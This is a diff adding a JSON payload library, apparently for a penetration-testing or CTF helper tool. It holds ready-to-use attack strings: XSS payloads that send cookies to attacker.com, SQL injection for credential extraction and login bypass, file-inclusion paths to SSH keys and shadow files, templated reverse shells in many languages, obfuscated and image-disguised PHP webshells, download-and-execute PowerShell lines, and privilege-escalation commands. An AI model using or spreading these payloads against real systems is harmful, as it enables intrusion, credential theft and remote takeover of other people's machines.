@@ -1,0 +1,282 @@
+{
+  "xss": {
+    "Cookie 窃取": [
+      { "payload": "<script>new Image().src=\"http://attacker.com/steal.php?cookie=\"+document.cookie;</script>", "desc": "Image 标签窃取" },
+      { "payload": "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie;</script>", "desc": "Location 重定向窃取" },
+      { "payload": "<script>fetch('http://attacker.com',{method:'POST',body:document.cookie});</script>", "desc": "Fetch POST 窃取" },
+      { "payload": "<script>new Audio(\"http://attacker.com/steal.php?cookie=\"+document.cookie);</script>", "desc": "Audio 标签窃取" }
+    ],
+    "基础 XSS": [
+      { "payload": "<script>alert('XSS')</script>" },
+      { "payload": "<img src=x onerror=alert('XSS')>" },
+      { "payload": "<svg onload=alert('XSS')>" },
+      { "payload": "<body onload=alert('XSS')>" }
+    ],
+    "Img 标签": [
+      { "payload": "<img src=x onerror=alert('XSS')>" },
+      { "payload": "<img src=x onerror=\"javascript:alert('XSS')\">" },
+      { "payload": "<img \"\"\"><script>alert('XSS')</script>" },
+      { "payload": "<img src=x onerror=alert(String.fromCharCode(88,83,83))>" },
+      { "payload": "<img src=1 onerror=alert(1)>" },
+      { "payload": "<img src=x:alert(alt) onerror=eval(src) alt=0>" },
+      { "payload": "<img src=\"x\" onerror=\"&#97;lert(1)\">" },
+      { "payload": "<img src=x onerror=alert`1`>" }
+    ],
+    "Markdown 注入": [
+      { "payload": "[click](javascript:alert('XSS'))" },
+      { "payload": "![image](javascript:alert('XSS'))" },
+      { "payload": "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=)" },
+      { "payload": "<details open ontoggle=alert('XSS')>" }
+    ],
+    "SVG 注入": [
+      { "payload": "<svg onload=alert('XSS')>" },
+      { "payload": "<svg><script>alert('XSS')</script></svg>" },
+      { "payload": "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>" },
+      { "payload": "<svg><set onmouseover=alert('XSS') attributeName=onmouseover to=alert(1)>" }
+    ],
+    "绕过黑名单": [
+      { "payload": "<script>eval(atob('YWxlcnQoJ1hTUycp'));</script>", "desc": "Base64 编码绕过" },
+      { "payload": "<script>Function(atob('YWxlcnQoJ1hTUycp'))();</script>", "desc": "Function 构造器绕过" },
+      { "payload": "<script>['alert'].forEach(function(f){window[f]('XSS')});</script>", "desc": "数组遍历绕过" },
+      { "payload": "<script>window['al'+'ert']('XSS');</script>", "desc": "window 对象拼接" },
+      { "payload": "<script>self['al'+'ert']('XSS');</script>", "desc": "self 对象拼接" },
+      { "payload": "<script>top['al'+'ert']('XSS');</script>", "desc": "top 对象拼接" },
+      { "payload": "<script>parent['al'+'ert']('XSS');</script>", "desc": "parent 对象拼接" }
+    ]
+  },
+  "sqli": {
+    "列数探测": [
+      { "payload": "' ORDER BY 1--+" },
+      { "payload": "' ORDER BY 2--+" },
+      { "payload": "' ORDER BY 3--+" },
+      { "payload": "' ORDER BY 4--+" },
+      { "payload": "' ORDER BY 5--+" },
+      { "payload": "' UNION SELECT NULL,NULL,NULL--+", "desc": "默认 3 列" }
+    ],
+    "版本枚举": [
+      { "payload": "' UNION SELECT version(),NULL,NULL--+", "desc": "MySQL version()" },
+      { "payload": "' UNION SELECT @@version,NULL,NULL--+", "desc": "MySQL @@version" },
+      { "payload": "' UNION SELECT @@GLOBAL.VERSION,NULL,NULL--+", "desc": "MySQL 全局版本" }
+    ],
+    "表名枚举": [
+      { "payload": "' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema=database()--+" },
+      { "payload": "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--+" }
+    ],
+    "列名枚举": [
+      { "payload": "' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='users'--+", "desc": "默认表名 users" }
+    ],
+    "数据提取": [
+      { "payload": "' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL FROM users--+", "desc": "MySQL 0x3a 分隔" },
+      { "payload": "' UNION SELECT username||':'||password,NULL,NULL FROM users--+", "desc": "Oracle/SQLite || 拼接" }
+    ],
+    "报错注入": [
+      { "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--+", "desc": "EXTRACTVALUE" },
+      { "payload": "' AND 1=CAST((SELECT version()) AS INT)--+", "desc": "CAST" },
+      { "payload": "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--+", "desc": "UPDATEXML" }
+    ],
+    "延时注入": [
+      { "payload": "' AND IF(1=1,SLEEP(5),0)--+", "desc": "MySQL SLEEP" },
+      { "payload": "' AND (SELECT SLEEP(5))--+", "desc": "MySQL 子查询 SLEEP" },
+      { "payload": "'; WAITFOR DELAY '0:0:5'--+", "desc": "MSSQL WAITFOR" }
+    ],
+    "认证绕过": [
+      { "payload": "' OR 1=1--+" },
+      { "payload": "' OR '1'='1" },
+      { "payload": "admin'--" },
+      { "payload": "' OR '1'='1'/*" }
+    ],
+    "Order Union": [
+      { "payload": "' ORDER BY 1 UNION SELECT NULL,username,password FROM users--+", "desc": "默认表名 users" },
+      { "payload": "' ORDER BY 1,2 UNION SELECT NULL,load_file('/etc/passwd'),NULL--+", "desc": "文件读取" }
+    ]
+  },
+  "lfi": {
+    "目录遍历": [
+      { "payload": "../../../../../../../../../../etc/passwd" },
+      { "payload": "../../../../../../../../../../etc/shadow" },
+      { "payload": "..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts" }
+    ],
+    "PHP Wrapper": [
+      { "payload": "php://filter/convert.base64-encode/resource=../../../../etc/passwd", "desc": "Base64 读文件" },
+      { "payload": "php://filter/convert.base64-encode/resource=index.php", "desc": "Base64 读源码" },
+      { "payload": "expect://ls", "desc": "命令执行" },
+      { "payload": "php://input (POST body)", "desc": "POST 数据注入" },
+      { "payload": "data://text/plain,<?php phpinfo();?>", "desc": "Data 协议" }
+    ],
+    "RFI": [
+      { "payload": "http://evil.com/shell.txt" },
+      { "payload": "http://evil.com/shell.php?cmd=id" }
+    ],
+    "Linux 敏感文件": [
+      { "payload": "/etc/passwd" },
+      { "payload": "/etc/shadow" },
+      { "payload": "/etc/group" },
+      { "payload": "/etc/hostname" },
+      { "payload": "/etc/issue" },
+      { "payload": "/etc/ssh/ssh_config" },
+      { "payload": "/etc/ssh/sshd_config" },
+      { "payload": "/root/.ssh/id_rsa" },
+      { "payload": "/root/.ssh/authorized_keys" },
+      { "payload": "/home/$USER/.ssh/id_rsa" },
+      { "payload": "/home/$USER/.bash_history" },
+      { "payload": "/proc/self/environ" },
+      { "payload": "/proc/mounts" },
+      { "payload": "/var/run/secrets/kubernetes.io/serviceaccount/token" }
+    ],
+    "Apache 配置": [
+      { "payload": "/etc/apache2/apache2.conf" },
+      { "payload": "/etc/apache2/sites-available/000-default.conf" },
+      { "payload": "/etc/httpd/conf/httpd.conf" },
+      { "payload": "/usr/local/etc/apache2/httpd.conf" },
+      { "payload": "/var/log/apache2/access.log" },
+      { "payload": "/var/log/apache2/error.log" }
+    ],
+    "MySQL 文件": [
+      { "payload": "/var/lib/mysql/mysql/user.frm" },
+      { "payload": "/var/lib/mysql/mysql/user.MYD" },
+      { "payload": "/var/lib/mysql/mysql/user.MYI" }
+    ],
+    "Windows 敏感文件": [
+      { "payload": "/boot.ini" },
+      { "payload": "/windows/system32/drivers/etc/hosts" },
+      { "payload": "/windows/repair/SAM" },
+      { "payload": "/windows/panther/unattend.xml" },
+      { "payload": "/windows/system32/license.rtf" }
+    ]
+  },
+  "reverse_shell": {
+    "Linux / Mac": [
+      { "name": "Bash TCP", "payload": "bash -i >& /dev/tcp/{ip}/{port} 0>&1", "desc": "Linux, Mac", "tags": ["linux", "mac"] },
+      { "name": "Netcat mkfifo", "payload": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f", "desc": "Linux", "tags": ["linux"] },
+      { "name": "Netcat -e", "payload": "nc -e /bin/sh {ip} {port}", "desc": "Linux", "tags": ["linux"] },
+      { "name": "Ncat", "payload": "ncat {ip} {port} -e /bin/bash", "desc": "Linux", "tags": ["linux"] },
+      { "name": "Python", "payload": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "desc": "Linux, Mac", "tags": ["linux", "mac"] },
+      { "name": "Python3", "payload": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", "desc": "Linux, Mac", "tags": ["linux", "mac"] },
+      { "name": "Perl", "payload": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'", "desc": "Linux", "tags": ["linux"] },
+      { "name": "PHP", "payload": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh <&3 >&3 2>&3\");'", "desc": "Linux", "tags": ["linux"] },
+      { "name": "Ruby", "payload": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'", "desc": "Linux, Mac", "tags": ["linux", "mac"] },
+      { "name": "Socat", "payload": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}", "desc": "Linux", "tags": ["linux"] },
+      { "name": "Telnet", "payload": "rm -f /tmp/p; mknod /tmp/p p && telnet {ip} {port} 0/tmp/p", "desc": "Linux", "tags": ["linux"] },
+      { "name": "Zsh", "payload": "zsh -c 'zmodload -i zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0<&$REPLY'", "desc": "Linux, Mac", "tags": ["linux", "mac"] },
+      { "name": "Lua", "payload": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3')\"", "desc": "Linux", "tags": ["linux"] },
+      { "name": "Golang", "payload": "echo 'package main;import \"os/exec\";func main(){exec.Command(\"/bin/sh\",\"-i\").Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go", "desc": "Linux", "tags": ["linux"] },
+      { "name": "Awk", "payload": "awk 'BEGIN{s=\"/inet/tcp/0/{ip}/{port}\";while(1){do{printf \"$ \"|&s;s|&getline c;if(c){while((c|&s)>0)print $0|&s;close(c)}}while(c!=\"exit\")}}'", "desc": "Linux", "tags": ["linux"] },
+      { "name": "Dart", "payload": "import 'dart:io';import 'dart:convert';main(){Socket.connect('{ip}',{port}).then((s){s.cast<List<int>>().transform(Utf8Encoder()).pipe(s);stdin.pipe(s);});}", "desc": "跨平台", "tags": ["linux", "mac", "windows"] }
+    ],
+    "Windows": [
+      { "name": "PowerShell", "payload": "$c=New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+\"PS \"+(pwd).Path+\"> \";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()", "desc": "Windows PowerShell", "tags": ["windows"] },
+      { "name": "PowerShell TLS", "payload": "$c=New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$s=$c.GetStream();$ssl=New-Object System.Net.Security.SslStream($s,$false);[void]$ssl.AuthenticateAsClient(\"{ip}\");$sb=New-Object System.Text.StringBuilder;while($true){$sb.Clear();[byte[]]$b=0..65535|%{0};$t=$ssl.Read($b,0,$b.Length);$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$t);$r=(iex $d 2>&1|Out-String);$r2=$r+\"PS \"+(pwd).Path+\"> \";$ssl.Write([text.encoding]::ASCII.GetBytes($r2),0,$r2.Length);$ssl.Flush()};$c.Close()", "desc": "Windows PowerShell TLS", "tags": ["windows"] }
+    ],
+    "Java": [
+      { "name": "Java Runtime", "payload": "Runtime rt = Runtime.getRuntime(); String[] cmd = {\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/{ip}/{port} 0>&1\"}; Process p = rt.exec(cmd);", "desc": "Java", "tags": ["linux"] }
+    ]
+  },
+  "webshell": {
+    "基础一句话": [
+      { "payload": "<?php @eval($_POST[\"cmd\"]);?>", "desc": "eval POST" },
+      { "payload": "<?php system($_GET[\"cmd\"]);?>", "desc": "system GET" },
+      { "payload": "<?php passthru($_GET[\"cmd\"]);?>", "desc": "passthru GET" },
+      { "payload": "<?php echo shell_exec($_GET[\"cmd\"]);?>", "desc": "shell_exec GET" }
+    ],
+    "混淆一句话": [
+      { "payload": "<?=`$_GET[0]`?>", "desc": "短标签反引号" },
+      { "payload": "<?=`$_POST[0]`?>", "desc": "短标签反引号 POST" },
+      { "payload": "<?=`${$_REQUEST[\"_\"]}`?>", "desc": "可变变量" },
+      { "payload": "<?php $a=\"sys\".\"tem\";$a($_GET[\"cmd\"]);?>", "desc": "字符串拼接" },
+      { "payload": "<?php $_GET[\"a\"]($_GET[\"b\"]);?>", "desc": "可变函数" },
+      { "payload": "<?php @assert($_POST[\"cmd\"]);?>", "desc": "assert" }
+    ],
+    "图片马": [
+      { "payload": "GIF89a<?php @eval($_POST[\"cmd\"]);?>", "desc": "GIF 头" },
+      { "payload": "GIF89a<?=`$_GET[0]`?>", "desc": "GIF 头短标签" }
+    ],
+    "文件上传利用": [
+      { "payload": "<?php file_put_contents(\"shell.php\",\"<?php @eval(\\$_POST[cmd]);?>\");?>", "desc": "写入 shell" },
+      { "payload": "<?php move_uploaded_file($_FILES[\"f\"][\"tmp_name\"],\"shell.php\");?>", "desc": "移动上传文件" }
+    ],
+    "绕过 disable_functions": [
+      { "payload": "<?php putenv(\"LD_PRELOAD=/tmp/evil.so\");mail(\"a\",\"a\",\"a\");?>", "desc": "LD_PRELOAD 劫持" },
+      { "payload": "<?php ini_set(\"disable_functions\",\"\");?>", "desc": "ini_set 清空" }
+    ]
+  },
+  "cmdref": {
+    "Linux SUID 提权": [
+      { "payload": "find / -user root -perm -4000 -exec ls -ldb {} \\;" },
+      { "payload": "find / -perm -u=s -type f 2>/dev/null" },
+      { "payload": "find / -name '*.txt' 2>/dev/null" },
+      { "payload": "getcap -r / 2>/dev/null" }
+    ],
+    "系统版本信息": [
+      { "payload": "cat /etc/issue" },
+      { "payload": "cat /etc/*-release*" },
+      { "payload": "cat /etc/lsb-release" },
+      { "payload": "uname -a" },
+      { "payload": "cat /proc/version" }
+    ],
+    "环境变量": [
+      { "payload": "env" },
+      { "payload": "set" },
+      { "payload": "cat /etc/profile" },
+      { "payload": "cat /etc/bashrc" },
+      { "payload": "~/.bash_history" }
+    ],
+    "Cron 任务": [
+      { "payload": "crontab -l" },
+      { "payload": "ls -alh /var/spool/cron" },
+      { "payload": "cat /etc/crontab" },
+      { "payload": "ls -la /etc/cron.d" },
+      { "payload": "cat /etc/at.allow" },
+      { "payload": "cat /etc/at.deny" }
+    ],
+    "端口转发": [
+      { "payload": "ssh -L 8080:target:80 user@remote" },
+      { "payload": "ssh -R 8080:target:80 user@remote" },
+      { "payload": "mkfifo backpipe; nc -l 8080 0<backpipe | nc target 80 1>backpipe" },
+      { "payload": "socat TCP-LISTEN:8080,fork TCP:target:80" },
+      { "payload": "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080" }
+    ],
+    "TTY Shell 升级": [
+      { "payload": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'" },
+      { "payload": "echo os.system(\"/bin/bash\")" },
+      { "payload": "perl -e 'exec \"/bin/sh\";'" },
+      { "payload": "lua -e \"os.execute('/bin/sh')\"" },
+      { "payload": "/bin/sh -i" },
+      { "payload": "# 步骤2: export TERM=xterm", "desc": "设置终端类型" },
+      { "payload": "# 步骤3: Ctrl+Z → stty raw -echo; fg", "desc": "Raw 模式" },
+      { "payload": "# 步骤4: stty rows 38 columns 116", "desc": "调整终端大小" }
+    ],
+    "PowerShell 系统枚举": [
+      { "payload": "systeminfo" },
+      { "payload": "Get-WmiObject Win32_ComputerSystem" },
+      { "payload": "$env:COMPUTERNAME" },
+      { "payload": "$env:USERNAME" },
+      { "payload": "whoami /all" },
+      { "payload": "Get-Process | Select-Object Name,Id" }
+    ],
+    "PowerShell 补丁信息": [
+      { "payload": "Get-HotFix | sort InstalledOn -Desc | ft -AutoSize" },
+      { "payload": "wmic qfe get Caption,Description,HotFixID,InstalledOn" }
+    ],
+    "PowerShell 网络信息": [
+      { "payload": "ipconfig /all" },
+      { "payload": "netstat -ano" },
+      { "payload": "Get-NetTCPConnection" },
+      { "payload": "route print" },
+      { "payload": "arp -a" }
+    ],
+    "PowerShell 文件下载": [
+      { "payload": "Invoke-WebRequest -Uri \"http://url/file\" -OutFile \"C:\\output\"" },
+      { "payload": "certutil -urlcache -f http://url/file C:\\output" },
+      { "payload": "(New-Object Net.WebClient).DownloadFile(\"http://url/file\",\"C:\\output\")" },
+      { "payload": "IEX (New-Object Net.WebClient).DownloadString(\"http://url/script.ps1\")" }
+    ],
+    "PowerShell WLAN 密码": [
+      { "payload": "netsh wlan show profiles" },
+      { "payload": "netsh wlan show profile name=\"PROFILE\" key=clear" }
+    ],
+    "通配符提权": [
+      { "payload": "touch --checkpoint-action=exec=sh shell.sh --checkpoint=1" },
+      { "payload": "tar cf /dev/null * --checkpoint=1 --checkpoint-action=exec=sh shell.sh" }
+    ]
+  }
+}
